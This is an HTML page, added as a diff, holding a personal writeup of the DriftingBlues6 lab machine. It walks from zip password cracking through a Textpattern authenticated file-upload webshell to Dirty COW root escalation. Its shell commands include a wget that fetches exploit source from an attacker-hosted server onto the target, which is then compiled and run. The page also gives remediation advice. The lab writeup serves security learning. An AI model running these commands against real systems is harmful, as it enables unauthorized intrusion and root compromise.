@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DriftingBlues6 — Writeup — Dos Vathanak Botra</title>
+<meta name="description" content="A password-protected zip cracked from the webroot hands over Textpattern CMS credentials, authenticated file-upload RCE gives a foothold, and Dirty COW (CVE-2016-5195) escalates to root. An OffSec Proving Grounds writeup.">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=IBM+Plex+Mono:wght@300;400;500;600&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/base.css">
+<link rel="stylesheet" href="../../css/nav.css">
+<link rel="stylesheet" href="../../css/footer.css">
+<link rel="stylesheet" href="../../css/animations.css">
+<link rel="stylesheet" href="../../css/responsive.css">
+<link rel="stylesheet" href="../writeups.css">
+<link rel="stylesheet" href="../../css/fx.css">
+<script src="../../js/fx-head.js"></script>
+</head>
+<body>
+<div class="fx-cube-cap" aria-hidden="true"></div>
+
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <a href="../../index.html" class="nav-logo" aria-label="Status: Junior">
+    <span class="nav-logo-dot" aria-hidden="true"></span>
+    <span class="nav-logo-key">STATUS:</span>
+    <span class="nav-logo-val">JUNIOR</span>
+  </a>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="../../index.html#about">About</a></li>
+    <li><a href="../../index.html#skills">Skills</a></li>
+    <li><a href="../../index.html#experience">Experience</a></li>
+    <li><a href="../../index.html#certificates">Certs</a></li>
+    <li><a href="../index.html">Writeups</a></li>
+    <li><a href="../../index.html#contact">Contact</a></li>
+  </ul>
+  <div class="nav-right">
+    <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" aria-label="Toggle light and dark theme">
+      <span class="theme-toggle-label" id="themeLabel">Dark</span>
+      <span class="theme-toggle-track"><span class="theme-toggle-thumb"></span></span>
+    </button>
+    <div class="hamburger" id="hamburger" onclick="toggleMenu()">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<main class="wu-main">
+  <a href="../index.html" class="wu-back">← All writeups</a>
+
+  <div class="wu-report-head">
+    <span class="badge cat-web">Web</span>
+    <span class="diff diff-easy">Easy</span>
+  </div>
+  <h1 class="wu-page-title">DriftingBlues6</h1>
+  <p class="wu-meta-line"><b>OffSec Proving Grounds</b> · Linux · Textpattern CMS · boot-to-root</p>
+
+  <!-- At a glance -->
+  <dl class="wu-glance reveal">
+    <div><dt>Vulnerability</dt><dd>Cracked zip → CMS creds → auth file-upload RCE → Dirty COW (CVE-2016-5195)</dd></div>
+    <div><dt>Impact</dt><dd>Full compromise — root flag captured</dd></div>
+    <div><dt>Tools</dt><dd>nmap, gobuster, zip2john, john, custom python exploit, gcc</dd></div>
+    <div><dt>Given</dt><dd>A single IP, no credentials</dd></div>
+  </dl>
+
+  <div class="wu-flag-wrap">
+    FLAG&nbsp; <span class="wu-flag-redacted">✓ root captured — value redacted</span>
+  </div>
+
+  <!-- Cyber Kill Chain -->
+  <div class="wu-kill-chain">
+    <div class="wu-kill-chain-title">Cyber Kill Chain</div>
+    <div class="wu-chain">
+      <div class="wu-chain-box" data-phase="recon"><span class="step-name">Reconnaissance</span><span class="step-detail">nmap, gobuster + .zip hint</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="credential"><span class="step-name">Credential Access</span><span class="step-detail">zip2john + john</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="exploit"><span class="step-name">Exploitation</span><span class="step-detail">Textpattern auth file upload RCE</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="privesc"><span class="step-name">Privilege Escalation</span><span class="step-detail">Dirty COW (CVE-2016-5195)</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="impact"><span class="step-name">Impact</span><span class="step-detail">root access</span></div>
+    </div>
+  </div>
+
+  <!-- MITRE ATT&CK Framework -->
+  <div class="wu-mitre-table">
+    <h2 style="border-left: 3px solid var(--green); padding-left: 0.85rem; color: var(--text); margin-bottom: 1rem;">MITRE ATT&CK Mapping</h2>
+    <table class="wu-table">
+      <thead>
+        <tr>
+          <th>Tactic</th>
+          <th>Technique</th>
+          <th>ID</th>
+          <th>Evidence</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>Discovery</strong></td>
+          <td>Active Scanning: Wordlist Scanning</td>
+          <td><a href="https://attack.mitre.org/techniques/T1595/003/" target="_blank" rel="noopener" style="color: var(--cyan);">T1595.003</a></td>
+          <td>gobuster with <code>-x zip</code> discovered <code>spammer.zip</code> and the Textpattern admin path</td>
+        </tr>
+        <tr>
+          <td><strong>Credential Access</strong></td>
+          <td>Brute Force: Password Cracking</td>
+          <td><a href="https://attack.mitre.org/techniques/T1110/002/" target="_blank" rel="noopener" style="color: var(--cyan);">T1110.002</a></td>
+          <td>zip2john + john cracked the zip password against rockyou; extracted <code>creds.txt</code> held CMS credentials</td>
+        </tr>
+        <tr>
+          <td><strong>Execution</strong></td>
+          <td>Server Software Component: Web Shell</td>
+          <td><a href="https://attack.mitre.org/techniques/T1505/003/" target="_blank" rel="noopener" style="color: var(--cyan);">T1505.003</a></td>
+          <td>Textpattern's authenticated file-upload endpoint accepted a PHP webshell (CVE-2021-47888 / EDB-48943)</td>
+        </tr>
+        <tr>
+          <td><strong>Privilege Escalation</strong></td>
+          <td>Exploitation for Privilege Escalation</td>
+          <td><a href="https://attack.mitre.org/techniques/T1068/" target="_blank" rel="noopener" style="color: var(--cyan);">T1068</a></td>
+          <td>Dirty COW (CVE-2016-5195) race condition overwrote <code>/etc/passwd</code> to set root's password</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- Vulnerability Analysis -->
+  <div class="wu-vuln-analysis">
+    <h3>Vulnerability Analysis</h3>
+    <p><strong>Root Causes:</strong> Sensitive files left in the webroot, a weak zip password, an unpatched CMS, and an EOL kernel combined into a complete chain from unauthenticated visitor to root.</p>
+    <ul style="color: var(--text2); margin-left: 1.3rem;">
+      <li><strong>CWE-312: Cleartext Storage of Sensitive Information</strong> — credentials were stored in a zip file published to the webroot</li>
+      <li><strong>CWE-434: Unrestricted Upload of File with Dangerous Type</strong> — CVE-2021-47888, Textpattern ≤ 4.8.3 authenticated arbitrary file upload</li>
+      <li><strong>CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization</strong> — CVE-2016-5195 (Dirty COW) race condition in Linux kernel &lt; 4.8.3</li>
+    </ul>
+    <p style="margin-top: 1rem;"><strong>CVE references:</strong>
+      <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-47888" target="_blank" rel="noopener">CVE-2021-47888</a> (Textpattern RCE, CVSS v3.1 <strong>8.8 High</strong>) ·
+      <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-5195" target="_blank" rel="noopener">CVE-2016-5195</a> (Dirty COW, CVSS v3.1 <strong>7.0 High</strong>)
+    </p>
+    <p><strong>References:</strong>
+      <br><a href="https://cwe.mitre.org/data/definitions/312.html" class="cve-link" target="_blank" rel="noopener">CWE-312</a>
+      <a href="https://cwe.mitre.org/data/definitions/434.html" class="cve-link" target="_blank" rel="noopener">CWE-434</a>
+      <a href="https://cwe.mitre.org/data/definitions/362.html" class="cve-link" target="_blank" rel="noopener">CWE-362</a>
+    </p>
+  </div>
+
+  <div class="wu-body">
+
+    <h2>Summary</h2>
+    <p>DriftingBlues6 runs a single public service: Apache on port 80 hosting <strong>Textpattern CMS 4.8.3</strong>
+    on a Debian 7 (Wheezy) machine. A hint in <code>robots.txt</code> directed the directory brute-force to scan
+    for zip files; one was found at the webroot and its password was cracked instantly with John. The extracted
+    credentials unlocked the CMS admin panel, which was vulnerable to an authenticated arbitrary file-upload
+    flaw that placed a PHP webshell. The foothold as <code>www-data</code> was on a kernel (3.2.0-4) well within
+    the <strong>Dirty COW</strong> exploit range, which overwrote <code>/etc/passwd</code> and handed a root shell.</p>
+
+    <div class="wu-insight">
+      <p><strong>Key insight:</strong> two well-known CVEs (2016 and 2021) are still in scope on an EOL box.
+      "It's just a lab" and "it's an old CVE" are not excuses — the chain from webroot zip to root is
+      entirely reproducible.</p>
+    </div>
+
+    <h2>Recon</h2>
+    <p>Only one port open across the full range:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>nmap -p- --min-rate 2000 &lt;target&gt;
+nmap -sCV -p80 &lt;target&gt;</code></pre>
+    </div>
+
+    <table class="wu-table">
+      <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
+      <tbody>
+        <tr><td>80</td><td>HTTP</td><td>Apache 2.2.22 (Debian 7, PHP 5.5.38)</td></tr>
+      </tbody>
+    </table>
+
+    <p><code>robots.txt</code> disclosed the Textpattern admin path and left an explicit hint:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>text · robots.txt</span><button class="wu-copy">copy</button></div>
+<pre><code>Disallow: /textpattern/textpattern
+# dont forget to add .zip extension to your dir-brute ;)</code></pre>
+    </div>
+
+    <h2>Directory brute-force with .zip extension</h2>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>gobuster dir -u http://&lt;target&gt;/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x zip -t 50</code></pre>
+    </div>
+
+    <p><code>/spammer.zip</code> (200, 179 B) — a password-protected zip containing a single file,
+    <code>creds.txt</code>.</p>
+
+    <h2>Password cracking</h2>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>zip2john spammer.zip &gt; spammer.hash
+john spammer.hash --wordlist=/usr/share/wordlists/rockyou.txt
+# zip password: &lt;redacted&gt;  (cracked instantly)</code></pre>
+    </div>
+
+    <p>Extracted <code>creds.txt</code> held a single username:password pair, valid for the Textpattern admin
+    panel at <code>/textpattern/textpattern/index.php</code>.</p>
+
+    <h2>Initial access — Textpattern authenticated RCE (CVE-2021-47888)</h2>
+    <p>Textpattern ≤ 4.8.3 allows authenticated users to upload arbitrary files through the Files section
+    (<code>event=file&amp;step=file_insert</code>). The public exploit (EDB-48943) needed two patches to work
+    against this specific version:</p>
+
+    <ul>
+      <li>A <code>GET</code> request to prime the <code>txp_test_cookie</code> before the login <code>POST</code>
+      (Textpattern rejects logins without the cookie)</li>
+      <li>The <code>_txp_token</code> scraper used a hard-coded index that didn't match this version — replaced
+      with a regex extraction</li>
+    </ul>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>python3 textpattern_rce.py http://&lt;target&gt;/textpattern &lt;user&gt; &lt;pass&gt;
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# Webshell at /textpattern/files/&lt;random&gt;.php</code></pre>
+    </div>
+
+    <div class="wu-insight">
+      <p>Reading the exploit before running it found the two bugs and avoided a frustrating silent failure. Patch
+      the tool; don't assume public PoCs work unchanged against every target version.</p>
+    </div>
+
+    <h2>Privilege escalation — Dirty COW (CVE-2016-5195)</h2>
+    <p>The foothold is on Linux kernel <strong>3.2.0-4-amd64</strong> — well within Dirty COW's affected range
+    (kernels &lt; 4.8.3). There are no sudo rights and no writable cron. Dirty COW exploits a race condition in
+    the kernel's copy-on-write handling of memory-mapped files to overwrite read-only files. The
+    <code>/etc/passwd</code> variant (EDB-40847) sets root's password to a known value:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code># Transfer from attacker's HTTP server
+cd /tmp && wget http://&lt;attacker&gt;:8000/40847.cpp -O dcow.cpp
+
+# Compile and run on target
+g++ -Wall -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
+./dcow
+# Root password set to: &lt;redacted&gt;
+
+# Spawn a PTY and escalate
+python -c "import pty; pty.fork()"
+su root   # password: &lt;redacted&gt;
+# uid=0(root) gid=0(root) groups=0(root)
+# &lt;root flag redacted&gt;</code></pre>
+    </div>
+
+    <h2>Findings &amp; remediation</h2>
+    <table class="wu-table">
+      <thead><tr><th>#</th><th>Finding</th><th>Severity</th><th>Remediation</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>Credentials in a zip published to the webroot</td><td>Critical</td><td>Never store secrets in the webroot; the zip gave everything needed to compromise the CMS</td></tr>
+        <tr><td>2</td><td>Weak zip password cracked against rockyou</td><td>High</td><td>Use a strong, unique passphrase; a weak password on a credential file is no protection</td></tr>
+        <tr><td>3</td><td>Textpattern 4.8.3 — authenticated arbitrary file upload (CVE-2021-47888)</td><td>High</td><td>Upgrade Textpattern; restrict uploadable file types to images/documents; block PHP execution in upload directories</td></tr>
+        <tr><td>4</td><td>Kernel 3.2.0 — Dirty COW (CVE-2016-5195)</td><td>High</td><td>Upgrade to a supported kernel; Debian 7 has been EOL since 2018</td></tr>
+        <tr><td>5</td><td>robots.txt disclosed admin path and hinted at zip files</td><td>Low</td><td>robots.txt is public — don't use it to catalogue sensitive paths</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Takeaways</h2>
+    <ul>
+      <li><strong>robots.txt is not a hiding place</strong> — it's one of the first files every scanner reads.</li>
+      <li><strong>Patch the exploit, not just the target.</strong> The public PoC had two bugs specific to this
+      version; understanding the auth flow fixed both in minutes.</li>
+      <li><strong>EOL infrastructure means unpatched CVEs.</strong> A 2016 kernel exploit was the fastest path
+      to root because no backport was ever applied.</li>
+    </ul>
+
+  </div>
+
+  <!-- References & Standards Alignment -->
+  <div class="wu-references">
+    <h3>References & Standards</h3>
+    <ul>
+      <li class="ref-category">MITRE Framework</li>
+      <li><a href="https://attack.mitre.org/" target="_blank" rel="noopener">MITRE ATT&CK — Adversary Tactics, Techniques, and Common Knowledge</a></li>
+
+      <li class="ref-category">Vulnerability &amp; Weakness</li>
+      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-47888" target="_blank" rel="noopener">CVE-2021-47888 — Textpattern CMS ≤ 4.8.3 Authenticated RCE</a></li>
+      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-5195" target="_blank" rel="noopener">CVE-2016-5195 — Dirty COW Linux Kernel Privilege Escalation</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/312.html" target="_blank" rel="noopener">CWE-312: Cleartext Storage of Sensitive Information</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/434.html" target="_blank" rel="noopener">CWE-434: Unrestricted Upload of File with Dangerous Type</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/362.html" target="_blank" rel="noopener">CWE-362: Race Condition / Concurrent Execution Vulnerability</a></li>
+
+      <li class="ref-category">Security Guidance</li>
+      <li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top 10 — Most Critical Web Application Security Risks</a></li>
+      <li><a href="https://www.cisecurity.org/cis-benchmarks/" target="_blank" rel="noopener">CIS Benchmarks — Security Configuration Standards</a></li>
+      <li><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf" target="_blank" rel="noopener">NIST SP 800-61: Computer Security Incident Handling Guide</a></li>
+    </ul>
+  </div>
+</main>
+
+<footer>
+  <div class="footer-name">DOS VATHANAK BOTRA</div>
+  <div class="footer-copy">© 2025 Dos Vathanak Botra. All rights reserved. · Phnom Penh, Cambodia</div>
+  <div class="footer-links">
+    <a href="../../index.html#hero">Home</a>
+    <a href="../index.html">Writeups</a>
+    <a href="../../index.html#contact">Contact</a>
+  </div>
+</footer>
+
+<script src="../../js/theme.js"></script>
+<script src="../../js/nav.js"></script>
+<script src="../../js/fx.js"></script>
+<script src="../writeups.js"></script>
+<script src="../../js/analytics.js"></script>
+</body>
+</html>
